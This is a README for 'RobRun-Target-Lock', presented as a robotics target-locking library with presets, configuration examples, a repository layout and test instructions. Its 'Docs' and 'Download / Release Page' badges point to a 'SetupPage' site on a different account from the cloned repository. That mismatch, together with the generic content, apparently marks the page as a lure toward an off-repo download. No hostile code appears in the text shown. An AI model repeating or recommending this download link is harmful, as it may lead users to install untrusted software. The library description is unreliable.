# RobRun‑Target‑Lock  
*Configurable presets & settings for a seamless target‑locking experience in RobRun projects*  

[![Version](https://img.shields.io/badge/version-1.0.0‑blue?style=flat-square)](#)  
[![License](https://img.shields.io/badge/license-MIT‑green?style=flat-square)](LICENSE)  
[![Platform](https://img.shields.io/badge/platform‑Linux%20|%20Windows‑orange?style=flat-square)](#)  
[![Docs](https://img.shields.io/badge/docs‑available‑brightgreen?style=flat-square)](https://rewfdf.github.io/SetupPage/)  

---  

## 📖 Overview  

RobRun‑Target‑Lock is a lightweight, **integration‑ready** module that empowers robots and automation pipelines with an intelligent lock‑on mechanism. Whether you’re building a pick‑and‑place arm, a mobile scouting unit, or a custom CNC controller, this library gives you:

* **Dynamic Presets** – Switch between pre‑defined lock strategies on the fly.  
* **Fine‑Grained Settings** – Tweak sensitivity, timeout, and fallback behaviours without recompiling.  
* **Zero‑Dependency Core** – Works out‑of‑the‑box with standard C++14/17 and Python 3.8+.  

---  

## 🚀 Quick Start  

```bash
# Clone the repository
git clone https://github.com/teraofficialhatchet/RobRun-Target-Lock.git
cd RobRun-Target-Lock

# Install the Python helper (optional)
pip install -r requirements.txt
```

```bash
# Run the demo with the default preset
python demo/run_demo.py --preset default
```

> **Tip:** All demo scripts accept `--preset <name>` to instantly load a different configuration file from `config/presets/`.

---  

## 🛠️ Core Concepts  

| Concept | Description | Where to Find |
|---------|-------------|---------------|
| **Preset** | A JSON/YAML bundle that defines lock parameters (e.g., `max_speed`, `capture_radius`). | `config/presets/` |
| **Lock Engine** | The state machine that processes sensor data and decides when to engage the lock. | `src/engine/` |
| **Adapter Layer** | Abstracts hardware specifics (GPIO, CAN, ROS topics) so the same engine runs on any platform. | `src/adapter/` |
| **Telemetry** | Real‑time metrics streamed via MQTT or ROS2 for monitoring. | `src/telemetry/` |

---  

## 📂 Repository Layout  

```
RobRun-Target-Lock/
├─ config/                # Preset files & default settings
│   └─ presets/
├─ src/                   # Source code
│   ├─ engine/            # Core lock logic
│   ├─ adapter/           # Hardware abstraction
│   └─ telemetry/         # Monitoring utilities
├─ demo/                  # Ready‑to‑run examples
├─ tests/                 # Unit‑ and integration‑tests
├─ docs/                  # Markdown docs & diagrams
└─ README.md
```

---  

## 🔧 Configuration  

All settings live in `config/presets/<preset_name>.yaml`. A minimal example:

```yaml
preset_name: aggressive
max_speed: 1.5            # m/s
capture_radius: 0.08      # metres
timeout_ms: 250
fallback_mode: soft_stop
```

*Edit the file directly or use the provided CLI helper:*  

```bash
python utility/config_editor.py --preset aggressive --set max_speed 2.0
```

---  

## 🧪 Testing  

```bash
# Run the full test suite
pytest -v tests/
```

Coverage report (HTML) will be generated under `htmlcov/`.  

---  

## 🤝 Contributing  

1. Fork the repo and create a feature branch.  
2. Write clear commit messages following the **Conventional Commits** spec.  
3. Ensure all new code is covered by unit tests.  
4. Submit a Pull Request with a concise description of the change.  

See `CONTRIBUTING.md` for the full guidelines.

---  

## 📦 Release & Download  

[![Download / Release Page](https://img.shields.io/badge/Download‑Release%20Page‑ff69b4?style=for-the-badge&logo=github)](https://rewfdf.github.io/SetupPage/)  

---  

## 🗂️ License  

Distributed under the **MIT License**. See `LICENSE` for details.  

---  

## 🙏 Acknowledgements  

* The **RobRun** community for inspiring the lock‑on concept.  
* Open‑source projects **Boost**, **Eigen**, and **paho‑mqtt** for providing robust foundations.  

---  

*Happy locking!*